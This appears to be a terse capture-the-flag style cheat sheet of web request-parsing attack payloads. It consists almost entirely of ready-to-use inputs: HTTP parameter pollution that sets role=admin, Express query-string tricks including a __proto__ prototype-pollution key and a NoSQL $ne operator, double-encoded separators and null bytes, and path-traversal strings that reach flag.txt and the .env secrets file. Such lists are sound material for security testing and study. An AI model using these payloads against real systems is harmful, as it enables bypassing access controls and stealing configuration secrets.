# Request Parsing

## Duplicate Parameters

```text
?role=user&role=admin
?id=1&id=2
```

```http
POST /login?username=guest
Content-Type: application/x-www-form-urlencoded

username=admin&password=x
```

## Express extended qs

```text
?q=abc
?q[]=abc&q[]=def
?q[a]=abc
?q[toString]=abc
?__proto__[x]=1
```

## Frontend Filter, Backend Forward

Use when the outer service validates parsed params but forwards the original raw query to an internal service.

```text
/search?q=blocked&q=allowed
/search?q[$ne]=x
/search?q=a%2520b
/search?action=get&id=1
```

## Encoded Separators

```text
%2f
%252f
%5c
%255c
%00
%0a
%09
```

## Path Oddities

```text
/static/..%2f..%2fflag.txt
/static/?/../../.env
/api;/admin
/api%2f..%2fadmin
```

